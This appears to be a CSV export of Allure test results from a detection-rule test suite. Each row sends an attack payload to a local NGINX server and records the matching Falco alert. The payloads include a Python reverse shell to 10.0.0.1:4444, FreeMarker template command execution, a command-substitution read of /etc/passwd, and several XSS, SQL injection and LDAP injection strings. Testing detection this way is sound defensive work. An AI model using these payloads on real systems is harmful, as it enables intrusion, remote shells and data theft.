"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_FREEMKR_001` |
| **Name** | FreeMarker template command execution |
| **Category** | SSTI |
| **Subcategory** | freemarker |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<#assign ex=""freemarker.template.utility.Execute""?new()> ${ex(""whoami"")}`
- **Encoded**: `%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%20%24%7Bex%28%22whoami%22%29%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~15000ms
- **Timestamp**: 14:11:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_FREEMKR_001-1769350302127-logotw pattern_id=SSTI_FREEMKR_001 uri=/?q=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%20%24%7Bex%28%22whoami%22%29%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_FREEMKR_001-1769350302127-logotw pattern_id=SSTI_FREEMKR_001 uri=/?q=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%20%24%7Bex%28%22whoami%22%29%7D client=127.0.0.1

**Falco Log Entry**:
```
14:11:42.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_FREEMKR_001-1769350302127-logotw pattern_id=SSTI_FREEMKR_001 uri=/?q=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%20%24%7Bex%28%22whoami%22%29%7D client=127.0.0.1
```","1","test_e2e_with_logs[318_SSTI_FREEMKR_001]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_003` |
| **Name** | Python reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'`
- **Encoded**: `python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 14:11:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1769350291172-50gnb pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1769350291172-50gnb pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1

**Falco Log Entry**:
```
14:11:31.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1769350291172-50gnb pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1
```","2","test_e2e_with_logs[279_CMD_REVSH_003]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ENC_002` |
| **Name** | Unicode escaped script tag |
| **Category** | XSS |
| **Subcategory** | encoding_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\u003cscript\u003ealert(1)\u003c/script\u003e`
- **Encoded**: `%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 14:11:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1769350268142-wmuu57 pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1769350268142-wmuu57 pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:08.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1769350268142-wmuu57 pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[131_XSS_ENC_002]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_012` |
| **Name** | onclick event handler injection |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<div onclick=alert(1)>click</div>`
- **Encoded**: `%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 14:11:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1769350265638-wfxj2v pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1769350265638-wfxj2v pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:05.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1769350265638-wfxj2v pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[156_XSS_REFL_012]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_010` |
| **Name** | setTimeout string DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `setTimeout('alert(""DOM"")',1000)`
- **Encoded**: `setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 14:11:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_010-1769350277671-7nw5t pattern_id=XSS_DOM_010 uri=/?q=setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_010-1769350277671-7nw5t pattern_id=XSS_DOM_010 uri=/?q=setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:17.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_010-1769350277671-7nw5t pattern_id=XSS_DOM_010 uri=/?q=setTimeout%28%27alert%28%22DOM%22%29%27%2C1000%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[124_XSS_DOM_010]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_NEST_003` |
| **Name** | Triple nested substitution |
| **Category** | CMDINJ |
| **Subcategory** | nested_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$($($(echo cat) /etc/passwd))`
- **Encoded**: `%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 14:11:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=CMD_NEST_003-1769350294180-tvqgu8 pattern_id=CMD_NEST_003 uri=/?q=%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd)) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=CMD_NEST_003-1769350294180-tvqgu8 pattern_id=CMD_NEST_003 uri=/?q=%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd)) client=127.0.0.1

**Falco Log Entry**:
```
14:11:34.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=CMD_NEST_003-1769350294180-tvqgu8 pattern_id=CMD_NEST_003 uri=/?q=%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd)) client=127.0.0.1
```","2","test_e2e_with_logs[272_CMD_NEST_003]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_064` |
| **Name** | Body onload Handler |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<body onload=alert(1)>`
- **Encoded**: `%3Cbody%20onload%3Dalert%281%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 14:11:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_064-1769350291705-3jpp4e pattern_id=XSS_ADV_064 uri=/?q=%3Cbody%20onload%3Dalert%281%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_064-1769350291705-3jpp4e pattern_id=XSS_ADV_064 uri=/?q=%3Cbody%20onload%3Dalert%281%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:31.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_064-1769350291705-3jpp4e pattern_id=XSS_ADV_064 uri=/?q=%3Cbody%20onload%3Dalert%281%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[102_XSS_ADV_064]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_015` |
| **Name** | ASCII function test |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR ASCII('A')=65 --`
- **Encoded**: `'%20OR%20ASCII('A')%3D65%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 14:11:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1769350290703-35vqr9 pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1769350290703-35vqr9 pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:30.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1769350290703-35vqr9 pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[044_SQLI_BOOL_015]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_004` |
| **Name** | Table name extraction via information_schema |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --`
- **Encoded**: `%27%20UNION%20SELECT%20table_name%2CNULL%2CNULL%20FROM%20information_schema.tables%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 14:11:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_UNION_004-1769350277674-ucvoh pattern_id=SQLI_UNION_004 uri=/?q=%27%20UNION%20SELECT%20table_name%2CNULL%2CNULL%20FROM%20information_schema.tables%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_UNION_004-1769350277674-ucvoh pattern_id=SQLI_UNION_004 uri=/?q=%27%20UNION%20SELECT%20table_name%2CNULL%2CNULL%20FROM%20information_schema.tables%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:17.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_UNION_004-1769350277674-ucvoh pattern_id=SQLI_UNION_004 uri=/?q=%27%20UNION%20SELECT%20table_name%2CNULL%2CNULL%20FROM%20information_schema.tables%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[091_SQLI_UNION_004]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BASIC_004` |
| **Name** | LDAP common name wildcard injection |
| **Category** | LDAP |
| **Subcategory** | basic_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `*)(cn=*`
- **Encoded**: `*)(cn%3D*`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 14:11:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_004-1769350281626-2c5fp pattern_id=LDAP_BASIC_004 uri=/?q=*)(cn%3D* client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_004-1769350281626-2c5fp pattern_id=LDAP_BASIC_004 uri=/?q=*)(cn%3D* client=127.0.0.1

**Falco Log Entry**:
```
14:11:21.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_004-1769350281626-2c5fp pattern_id=LDAP_BASIC_004 uri=/?q=*)(cn%3D* client=127.0.0.1
```","1","test_e2e_with_logs[294_LDAP_BASIC_004]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
